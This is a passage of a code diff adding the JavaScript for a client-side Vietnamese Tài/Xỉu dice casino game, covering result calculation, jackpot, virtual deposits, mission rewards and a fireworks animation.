+        }, 80);
+    }
 
-  await sendMessage(msg);
-});
+    calcResult() {
+        let isJp = Math.random() < 0.01; // Tỉ lệ Jackpot 1%
+        let d = [1,1,1];
+        if(isJp) {
+            let n = Math.floor(Math.random()*6)+1;
+            d = [n,n,n];
+        } else {
+            let trend = this.history[this.history.length-1] || 'TAI';
+            let winType = Math.random() < 0.6 ? trend : (trend==='TAI'?'XIU':'TAI');
+            let target = winType === 'TAI' ? (Math.floor(Math.random()*7)+11) : (Math.floor(Math.random()*8)+3);
+            let cur = 3;
+            while(cur < target) { 
+                let i = Math.floor(Math.random()*3); 
+                if(d[i]<6){d[i]++; cur++;} 
+            }
+            if(d[0]===d[1] && d[1]===d[2]) d[0] = d[0]===6?5:d[0]+1;
+        }
+        let sum = d[0]+d[1]+d[2];
+        return { dice: d, sum, res: sum >= 11 ? 'TAI' : 'XIU', isJp };
+    }
 
+    finalize() {
+        const r = this.currentRes;
+        document.getElementById('d1').innerText = r.dice[0];
+        document.getElementById('d2').innerText = r.dice[1];
+        document.getElementById('d3').innerText = r.dice[2];
+
+        if(r.isJp) {
+            this.playSound('s-jp');
+            this.triggerJackpot(this.jackpot);
+            this.jackpot = 100000000;
+        } else {
+            let win = r.res === 'TAI' ? this.betTai * 2 : this.betXiu * 2;
+            if(win > 0) {
+                this.balance += win;
+                this.playSound('s-win');
+            }
+        }
+
+        this.history.push(r.res);
+        this.missionCount++;
+        this.updateUI();
+        document.getElementById('game-info').innerText = `KẾT QUẢ PHIÊN: ${r.res} (${r.sum})`;
+        document.getElementById('game-info').style.color = "#ffd700";
+        this.state = 'RESULT';
+        setTimeout(() => this.reset(), 5000);
+    }
+
+    triggerJackpot(amt) {
+        this.balance += amt;
+        document.getElementById('jp-win-amt').innerText = "+" + amt.toLocaleString();
+        document.getElementById('jackpot-alert').classList.add('active');
+        this.fireworks();
+    }
+
+    reset() {
+        this.state = 'BETTING'; this.timer = 20;
+        this.betTai = 0; this.betXiu = 0;
+        document.getElementById('lid').classList.remove('open');
+        document.getElementById('game-info').innerText = "Đang mở cổng đặt cược...";
+        document.getElementById('d1').innerText = "?";
+        document.getElementById('d2').innerText = "?";
+        document.getElementById('d3').innerText = "?";
+        this.updateUI();
+    }
+
+    updateUI() {
+        document.getElementById('balance').innerText = this.balance.toLocaleString();
+        document.getElementById('rank-val').innerText = (this.balance/1000000000).toFixed(2) + " Tỷ";
+        document.getElementById('jp-val').innerText = Math.floor(this.jackpot).toLocaleString();
+        document.getElementById('bet-tai-amt').innerText = this.betTai.toLocaleString();
+        document.getElementById('bet-xiu-amt').innerText = this.betXiu.toLocaleString();
+        document.getElementById('hist-dots').innerHTML = this.history.slice(-24).map(i => `<div class="dot ${i.toLowerCase()}"></div>`).join('');
+        
+        let progress = Math.min(this.missionCount, 5);
+        document.getElementById('m-text').innerText = `Tiến độ hiện tại: ${progress}/5 ván`;
+        document.getElementById('m-progress-bar').style.width = (progress/5 * 100) + "%";
+        
+        if(progress >= 5) {
+            const b = document.getElementById('m-btn');
+            b.style.background = "linear-gradient(to right, #f1c40f, #f39c12)";
+            b.style.color = "#000";
+            b.style.cursor = "pointer";
+            b.style.boxShadow = "0 0 10px gold";
+        }
+    }
+
+    /**
+     * HÀM NẠP TIỀN VỚI GIỚI HẠN 1 TỶ
+     */
+    deposit() {
+        let inputVal = document.getElementById('inp-dep').value;
+        let amount = parseInt(inputVal);
+
+        if(isNaN(amount) || amount <= 0) {
+            alert("Vui lòng nhập số tiền nạp hợp lệ!");
+            this.playSound('s-error');
+            return;
+        }
+
+        // Kiểm tra giới hạn nạp 1 tỷ
+        if(amount > this.maxDepositLimit) {
+            alert("⚠️ Số tiền nạp vượt quá giới hạn 1.000.000.000 / lần!\nChúng tôi đã tự động điều chỉnh về 1 Tỷ cho bạn.");
+            amount = this.maxDepositLimit;
+        }
+
+        this.balance += amount; 
+        this.updateUI();
+        document.getElementById('inp-dep').value = "";
+        
+        // Hiệu ứng tiền nhảy
+        document.getElementById('balance').style.transform = "scale(1.2)";
+        setTimeout(() => document.getElementById('balance').style.transform = "scale(1)", 200);
+        
+        this.playSound('s-chip');
+        console.log("Nạp thành công: " + amount);
+    }
+
+    claimMission() {
+        if(this.missionCount >= 5) {
+            this.balance += 100000000;
+            this.missionCount = 0;
+            this.updateUI();
+            
+            // Reset button style
+            const b = document.getElementById('m-btn');
+            b.style.background = "#444";
+            b.style.color = "#888";
+            b.style.cursor = "not-allowed";
+            b.style.boxShadow = "none";
+            
+            alert("🎁 NHẬN THƯỞNG THÀNH CÔNG!\nTài khoản được cộng 100,000,000 VNĐ.");
+            this.playSound('s-win');
+        } else {
+            alert("Bạn cần hoàn thành đủ 5 ván chơi!");
+        }
+    }
+
+    fireworks() {
+        const cv = document.getElementById('fw-canvas');
+        const cx = cv.getContext('2d');
+        cv.width = window.innerWidth; cv.height = window.innerHeight;
+        let pts = [];
+        for(let i=0; i<150; i++) {
+            pts.push({ x: cv.width/2, y: cv.height/2, vx: Math.random()*12-6, vy: Math.random()*12-6, c: `hsl(${Math.random()*360},100%,50%)`, l: 80 });
+        }
+        function draw() {
+            cx.clearRect(0,0,cv.width,cv.height);
+            pts.forEach((p,i) => {
+                p.x += p.vx; p.y += p.vy; p.vy += 0.1; p.l--;
+                cx.fillStyle = p.c; cx.beginPath(); cx.arc(p.x, p.y, 3, 0, Math.PI*2); cx.fill();
+                if(p.l<=0) pts.splice(i,1);
+            });
+            if(pts.length>0) requestAnimationFrame(draw);
+        }
+        draw();
+    }
+}
+
+// KHỞI TẠO ĐỐI TƯỢNG GAME
+const game = new RoyalCasino();
 </script>
-
-</body></html>
+</body>
+</html>
